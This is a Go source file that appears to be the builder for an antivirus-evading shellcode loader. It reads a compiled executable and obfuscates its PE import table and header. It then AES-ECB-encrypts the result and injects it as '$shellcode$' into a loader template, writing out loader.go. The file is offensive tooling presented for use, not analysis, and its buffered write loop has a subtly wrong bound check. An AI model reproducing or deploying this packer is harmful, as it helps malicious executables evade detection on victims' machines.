package main

import (
	"t1/payload"
	"t1/crypto"
	"os"
	"io"
	"strings"
	"encoding/json"
	"strconv"
)
func byteArrayToString(input []byte)string{
	var res string
	buf:=make([]byte,0,len(input)*2+len(input))
	m:=[]byte{'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'}
	for _,item:=range input{
		buf=append(buf,'0')
		buf=append(buf,'x')
		buf=append(buf,m[item>>4])
		buf=append(buf,m[item&0xf])
		buf=append(buf,',')

	}
	res=string(buf[:len(buf)-1])
	return res
}
func ReadFileToBuf(file *os.File)([]byte, error){
	
	fileInfo,err:=os.Stat(file.Name());
	if err!=nil{
		return nil ,err;
	}
	nFileSize:=fileInfo.Size();
	res:=make([]byte,0,nFileSize);

	buf:=make([]byte,4096)
	for{
		n,err:=io.ReadFull(file,buf)
		if err!=nil && err!=io.EOF && err!=io.ErrUnexpectedEOF{
			return nil, err;
		}
		if n==0{
			break
		}
		res=append(res,buf[:n]...)
	}
	return res,nil
}
func WriteBufToFile(file *os.File,input []byte)(err error){
	

	
	total:=len(input)
	start:=0
	for{
		n:=start+4096
		if start+n>total{
			n=total
		}
		n1,err:=file.Write(input[start:n])
		if err!=nil && err!=io.EOF{
			return err
		}
		start=start+n1
		
		if start>=total{
			break
		}
		
	}
	return nil
}
func ReadPayloadAndWriteToLoader(payloadFileName string,mode string,entryFuncName string)error{
	a:=crypto.NewAseECB()
	payloadFile,err:=os.Open(payloadFileName)
	if err!=nil{
		return err;
	}
	defer payloadFile.Close();
	res,err:=ReadFileToBuf(payloadFile);
	if res==nil{
		return err;
	}
	f:=&payload.File{File:res}
	f.ParseHeader();
	data, err := json.Marshal(&f.FileHeaderInfo);
	if err != nil{
		return err
	}
	data1:=strconv.Quote(string(data))
	//输出序列化后的结果
	
	f.ConfusionImportTable()
	f.ConfuseHeader()
	encry:=a.Encrypt(f.File,crypto.Key,128)
	s:=byteArrayToString(encry);


	loaderFileName:="D:\\Ide_project\\project\\go\\shell1\\payload\\loader_template"+mode;
	loaderFile,err:=os.Open(loaderFileName)
	if err!=nil{
		return err;
	}
	
	res,err=ReadFileToBuf(loaderFile);
	if err!=nil{
		return err;
	}
	loaderFile.Close();

	r:=strings.Replace(string(res),"$shellcode$",s,1);
	r=strings.Replace(r,"$fileInfo$",data1,1);
	r=strings.Replace(r,"$entryFuncName$",entryFuncName,1);
	loaderFile,err=os.Create("D:\\Ide_project\\project\\go\\shell1\\payload\\loader.go")
	
	if err!=nil{
		return err;
	}
	defer loaderFile.Close()
	WriteBufToFile(loaderFile,[]byte(r))
	return nil
}






func main() {
	
	//ReadPayloadAndWriteToLoader("D:\\Ide_project\\project\\c\\shell_c\\Release\\shell_c.exe","32","")
	
	
	payload.Gen1()
	
	
}